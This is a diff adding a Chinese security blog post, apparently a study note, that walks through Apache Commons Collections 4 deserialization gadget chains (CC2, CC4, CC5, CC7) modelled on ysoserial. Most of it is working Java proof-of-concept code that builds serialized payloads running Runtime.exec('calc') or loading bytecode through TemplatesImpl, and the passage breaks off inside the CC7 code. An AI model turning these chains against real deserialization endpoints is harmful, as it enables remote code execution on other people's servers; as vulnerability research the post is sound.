@@ -1,0 +1,375 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>java反序列化CommonsCollections利用链篇四 | Tptfb11&#39;S Blog</title>
+  <meta name="author" content="Tptfb11">
+  
+  <meta name="description" content="什么？CommonsCollections还有另一个版本？">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="java反序列化CommonsCollections利用链篇四"/>
+  <meta property="og:site_name" content="Tptfb11&#39;S Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Tptfb11&#39;S Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Tptfb11&#39;S Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="归档文章.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="文章分类.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="文章标签.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tools" title="常用工具.">
+			  <i class="fa fa-fighter-jet"></i>Tools
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/notes" title="生活随笔.">
+			  <i class="fa fa-paper-plane"></i>Notes
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="关于我.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> java反序列化CommonsCollections利用链篇四</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 什么？CommonsCollections还有另一个版本？
+		 </div> <!-- alert -->
+	  		
+
+	  <p>Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助⽅法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
+<p>Apache Commons Collections有以下两个分⽀版本： </p>
+<p>commons-collections:commons-collections </p>
+<p>org.apache.commons:commons-collections4</p>
+<p>既然3.2.1中存在反序列化利⽤链，那么4.0版本是否存在呢？</p>
+<h1 id="CC3等老链复用"><a href="#CC3等老链复用" class="headerlink" title="CC3等老链复用"></a>CC3等老链复用</h1><p>加入CC4依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​	修改代码导入包为：import org.apache.commons.collections4.*;<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201959823.png" alt="img"></p>
+<p>LazyMap没有decorate方法。与之替换成了lazyMap方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="title function_">lazyMap</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> K, ? extends V&gt; factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>&lt;K,V&gt;(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	修改过后仍可以执行：</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201959109.png" alt="img"></p>
+<p>同理，可以试⼀下之前看过的CommonsCollections1、CommonsCollections3，都可以在commonscollections4中正常使⽤。</p>
+<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>除了⽼的⼏个利⽤链，ysoserial中还有几条针对CommonsCollection4新的利用链，回顾一下commons-collections这个包之所有能攒出那么多利⽤链，其根本原因就是其中的一些transform方法可以执行任意方法，其利用链就可总结为：<strong>从 Serializable#readObject() ⽅法到 Transformer#transform()。</strong></p>
+<h2 id="PriorityQueue利⽤链"><a href="#PriorityQueue利⽤链" class="headerlink" title="PriorityQueue利⽤链"></a><strong>PriorityQueue利⽤链</strong></h2><p>按照规律，CC2中的就是从java.util.PriorityQueue#readObject方法到org.apache.commons.collections4.comparators.TransformingComparator#compare调用transform。</p>
+<p>java.util.PriorityQueue#readObject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.commons.collections4.comparators.TransformingComparator#compare</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两个方法是怎么拼接到一起的呢？</p>
+<p>我们接着看PriorityQueue#readObject中调用的heapify方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进siftDown方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进siftDownUsingComparator方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第8行很明显调用了compare方法。</p>
+<p>至此这就是一条完整的利用链，PriorityQueue#readObject-&gt;PriorityQueue#heapify-&gt;PriorityQueue#siftDown-&gt;PriorityQueue#siftDownUsingComparator-&gt;TransformingComparator#compare-&gt;InvokerTransformer#transform</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        transformingComparator.compare(Runtime.class,null);</span></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">4</span>,transformingComparator);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    size.set(priorityQueue,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//        priorityQueue.add(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">queueField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    queueField.set(priorityQueue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>,Runtime.class,<span class="number">2</span>,<span class="number">3</span>&#125;);</span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>观察ysoserial可以发现，commons-collections还存在CC4、CC5、CC7这几条利用链。浅浅分析一下。</p>
+<p>CC4就是将命令执行的Runtim类改成代码执行的TemplatesImpl。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">    <span class="comment">// 设置_name不为空</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="comment">// 定义字节码，反射修改_bytecodes的值</span></span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Study\\java sec\\04\\target\\classes\\outCalc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line">    <span class="comment">// _tfactory赋值</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>((Transformer) instantiateTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        transformingComparator.compare(templates,null);</span></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">4</span>,  transformingComparator);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    size.set(priorityQueue,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//        priorityQueue.add(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">queueField</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    queueField.set(priorityQueue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>, TrAXFilter.class,<span class="number">2</span>,<span class="number">3</span>&#125;);</span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    TiedMapEntry.toString()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                ConstantTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<p>这条链拼接的是BadAttributeValueExpException.readObject()和TiedMapEntry.toString()。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line">    <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.lazyMap(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(Runtime.class);</span></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,Runtime.class);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    valField.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">    serialize(badAttributeValueExpException);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br></pre></td></tr></table></figure>
+
+<p>这条链还是利用了LazyMap.get。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125; ,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    Map map1=LazyMap.lazyMap(hashMap1,transformerChain);</span><br><span class="line">    map1.put(<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">    map2.put(<span 